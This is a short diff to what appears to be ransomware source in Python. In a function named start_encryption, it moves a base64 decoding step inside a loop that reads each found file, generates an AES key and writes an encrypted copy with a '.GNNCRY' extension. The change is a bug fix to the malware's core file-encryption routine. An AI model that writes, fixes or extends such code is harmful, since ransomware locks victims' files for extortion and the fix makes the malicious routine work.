@@ -55,13 +55,13 @@ def start_encryption(files):
 
     for found_file in files:
         try:
+            found_file = base64.b64decode(found_file)
             with open(found_file, 'rb') as f:
                 new_file_name = found_file + ".GNNCRY"
                 with open(new_file_name, 'wb') as ef:
                     key = generate_keys.generate_key(128, True)
                     AES_obj = symmetric.AESCipher(key)
 
-                    found_file = base64.b64decode(found_file)
                     file_content = f.read()
 
                     encrypted = AES_obj.encrypt(file_content)
